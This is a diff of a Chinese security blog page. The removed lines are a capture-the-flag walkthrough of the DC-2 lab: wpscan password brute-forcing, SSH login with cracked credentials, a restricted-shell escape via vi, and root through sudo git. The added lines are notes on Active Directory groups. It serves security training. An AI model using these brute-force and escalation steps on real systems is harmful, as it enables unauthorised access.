-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>然后创建一个user.txt文件</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">touch user.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;admin&#34; &gt;&gt; user.txt
-</span></span><span class="line"><span class="cl">echo &#34;tom&#34; &gt;&gt; user.txt
-</span></span><span class="line"><span class="cl">echo &#34;jerry&#34; &gt;&gt; user.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆破登录框</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wpscan --url http://dc-2/ -U user.txt -P passwd.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>拿到用户和密码进行登录</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[!] Valid Combinations Found:                                                                                                           
-</span></span><span class="line"><span class="cl">Username: jerry, Password: adipiscing
-</span></span><span class="line"><span class="cl">Username: tom, Password: parturient
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>到处点一点拿到flag2</p>
-<p><img src="/p/test-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4.png"
-	width="852"
-	height="336"
-	srcset="/p/test-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu18027516157568359795.png 480w, /p/test-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu3052568483070104277.png 1024w"
+<h6 id="domain-users组">Domain users组
+</h6><p>Domain users（域成员组），在默认的情况下所有加入域内的主机都是在这个组内， 在域内的users组
+<img src="/p/test-chinese/index.assets/image-20241104230901222.png"
+	width="1008"
+	height="314"
+	srcset="/p/test-chinese/index.assets/image-20241104230901222_hu12096593033465144686.png 480w, /p/test-chinese/index.assets/image-20241104230901222_hu10839155905051079656.png 1024w"
 	loading="lazy"
+	
+		alt="image-20241104230901222"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="253"
-		data-flex-basis="608px"
+		data-flex-grow="321"
+		data-flex-basis="770px"
 	
 ></p>
-<p>意思：</p>
-<p>如果你不能利用WordPress并走捷径，还有另一种方法。</p>
-<p>希望你找到了另一个切入点。</p>
-<h2 id="flag3">flag3
-</h2><p>前面有一个7744端口的ssh远程连接服务</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh tom@192.168.26.129 -p 7744 
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>进行连接登录</p>
-<p><img src="/p/test-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6.png"
-	width="720"
-	height="190"
-	srcset="/p/test-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu7677809838715028512.png 480w, /p/test-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu4811569570229345252.png 1024w"
+<h6 id="domain-computers组">Domain Computers组
+</h6><p>任何由域管理员建立的账号都属于这个组
+<img src="/p/test-chinese/index.assets/image-20241104230907671.png"
+	width="1013"
+	height="543"
+	srcset="/p/test-chinese/index.assets/image-20241104230907671_hu254723960610241691.png 480w, /p/test-chinese/index.assets/image-20241104230907671_hu4378477109586489243.png 1024w"
 	loading="lazy"
+	
+		alt="image-20241104230907671"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="378"
-		data-flex-basis="909px"
+		data-flex-grow="186"
+		data-flex-basis="447px"
 	
 ></p>
-<p>ls-l查看文件目录，有一个flag3.txt</p>
-<p>cat 查看该文件发现权限不足</p>
-<p>查看可用的命令</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">compgen -c       //查看可以使用的指令
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">less
-</span></span><span class="line"><span class="cl">scp
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">vi
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>发现有个vi,用这个命令打开该文件</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vi flag3.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>拿到flag3</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>意思：</p>
-<p>可怜的老汤姆总是追着杰瑞跑。也许他应该为他造成的所有压力感到自豪。</p>
-<h2 id="flag4">flag4
-</h2><p>提示：大概意思就是提权</p>
-<p>打开一个文件，用vi去编辑，然后提权</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vi flag3.txt
-</span></span><span class="line"><span class="cl">:set shell=/bin/sh
-</span></span><span class="line"><span class="cl">:shell
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>执行</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">su
-</span></span><span class="line"><span class="cl">cd ..
-</span></span><span class="line"><span class="cl">ls -l
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>该目录下有 tom和jerry</p>
-<p>到jerry用户下面</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd jerry
-</span></span><span class="line"><span class="cl">vi flag4.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>flag4.txt</p>
-<blockquote>
-<p>ood to see that you&rsquo;ve made it this far - but you&rsquo;re not home yet.
-You still need to get the final flag (the only flag that really counts!!!).
-No hints here - you&rsquo;re on your own now. :-)
-Go on - git outta here!!!!</p>
-</blockquote>
-<h2 id="flag5">flag5
-</h2><p>切换到jerry用户下面</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">exit</span>
-</span></span><span class="line"><span class="cl"><span class="n">BASH_CMDS</span><span class="p">[</span><span class="n">su</span><span class="p">]</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
-</span></span><span class="line"><span class="cl"><span class="n">su</span>
-</span></span><span class="line"><span class="cl"><span class="n">xport</span> <span class="n">PATH</span><span class="o">=$</span><span class="n">PATH</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span>
-</span></span><span class="line"><span class="cl"><span class="k">export</span> <span class="n">PATH</span><span class="o">=$</span><span class="n">PATH</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span>
-</span></span><span class="line"><span class="cl"><span class="n">su</span> <span class="n">jerry</span>
-</span></span><span class="line"><span class="cl"><span class="err">输入</span><span class="n">jerry的密码</span><span class="err">，前面收集爆破到的密码</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="三提权">三、提权
-</h2><p>使用git提权即可</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo git help config
-</span></span><span class="line"><span class="cl">#这边直接输下面的命令，不用打：
-</span></span><span class="line"><span class="cl">!/bin/sh
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">su
-</span></span><span class="line"><span class="cl">cd /root
-</span></span><span class="line"><span class="cl">cat final-flag.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>flag5</p>
-<blockquote>
-<p>Congratulatons!!!
-A special thanks to all those who sent me tweets
-and provided me with feedback - it&rsquo;s all greatly
-appreciated.
-If you enjoyed this CTF, send me a tweet via @DCAU7.</p>
-</blockquote>
-<h1 id="总结">总结：
-</h1><p>希望对大家有帮助</p>
+<h5 id="域机器介绍">域机器介绍
+</h5><p>机器在加入到域之后可以使用域用户登录，也可以使用本机用户登录。
+区别：</p>
+<ol>
+<li>本地用户登录，是存放在本地文件中，然后本地进行校验。而域内用户，是要通过DC的认证之后才能登录，用户信息存放唉域控上</li>
+<li>本地用户登录主要是对比NTLM HASH值，域认证是通过Kerberos认证。</li>
+<li>机器可以选择本地登录或域用户登录，本地用户 机器名\用户名  域 内用户 域名\用户名。</li>
+</ol>
+<h6 id="域内最高管理员权限">域内最高管理员权限
+</h6><p>域内最高管理员权限是域控机器上的administrator，它是没有UAC认证的，它也是每个域内机器的本地管理员和机器名administrator具有相同的权限，SID也是500
+<img src="/p/test-chinese/index.assets/image-20241104230916727.png"
+	width="1005"
+	height="265"
+	srcset="/p/test-chinese/index.assets/image-20241104230916727_hu17059738960362032867.png 480w, /p/test-chinese/index.assets/image-20241104230916727_hu6651280779645704578.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230916727"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="379"
+		data-flex-basis="910px"
+	
+>
+登录方式：
+域名\用户名
+密码为域用户的密码
+<img src="/p/test-chinese/index.assets/image-20241104230931434.png"
+	width="788"
+	height="652"
+	srcset="/p/test-chinese/index.assets/image-20241104230931434_hu9252022422438854228.png 480w, /p/test-chinese/index.assets/image-20241104230931434_hu3843246680887864647.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104230931434"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="120"
+		data-flex-basis="290px"
+	
+>
+本地用户登录方式
+主机名\用户名
+密码为用户对应密码
+<img src="/p/test-chinese/index.assets/image-20241104231102478.png"
+	width="1302"
+	height="951"
+	srcset="/p/test-chinese/index.assets/image-20241104231102478_hu6529459968351220186.png 480w, /p/test-chinese/index.assets/image-20241104231102478_hu14392737193187588870.png 1024w"
+	loading="lazy"
+	
+		alt="image-20241104231102478"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="328px"
+	
+></p>
 
 </section>
 
@@ -849,7 +964,7 @@ If you enjoyed this CTF, send me a tweet via @DCAU7.</p>
     <section class="copyright">
         &copy; 
         
-        2024 鼎星实验室
+        2024 鼎新实验室
     </section>
     
     <section class="powerby">
